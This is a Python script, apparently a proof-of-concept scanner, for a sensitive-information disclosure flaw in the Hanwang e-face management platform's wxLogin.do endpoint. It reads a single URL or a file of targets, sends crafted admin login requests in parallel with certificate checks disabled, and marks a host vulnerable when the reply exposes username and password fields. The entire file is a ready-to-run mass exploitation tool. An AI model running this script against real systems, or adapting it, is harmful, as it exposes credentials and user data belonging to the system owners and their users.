import requests
import argparse
from multiprocessing.dummy import Pool
import urllib3

def main():
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    banner = """
                       .__   
___  ______  ______  __|  |  
\  \/  /\  \/  /\  \/  /  |  
 >    <  >    <  >    <|  |__
/__/\_ \/__/\_ \/__/\_ \____/
      \/      \/      \/     
    """
    print(banner)
    parse = argparse.ArgumentParser(description="汉王e脸通综合管理平台 wxLogin.do 存在敏感信息泄露")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请选择批量文件')
    args = parse.parse_args()
    urls = []
    url = args.url
    file = args.file
    if url:
        if "http" not in url:
            url = f"http://{args.url}"
        check(url)
    elif file:
        with open(file, 'r+') as f:
            for i in f:
                domain = i.strip()
                if "http" not in domain:
                    urls.append(f"http://{domain}")
                else:
                    urls.append(domain)
        pool = Pool(5)
        pool.map(check, urls)

def check(domain):
    url = f"{domain}/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0'
    }
    try:
        response = requests.post(url=url, headers=headers, verify=False, timeout=10, allow_redirects=False)
        res=response.text
        if response.status_code == 200 and "userName" in res and "password" in res and "recordTcpPort" in res and "userBranch" in res:
            print(f"[*]存在漏洞:{url}")
        else:
            print("[-]不存在漏洞")
    except Exception as e:
        print("网站出现错误")


if __name__ == '__main__':
    main()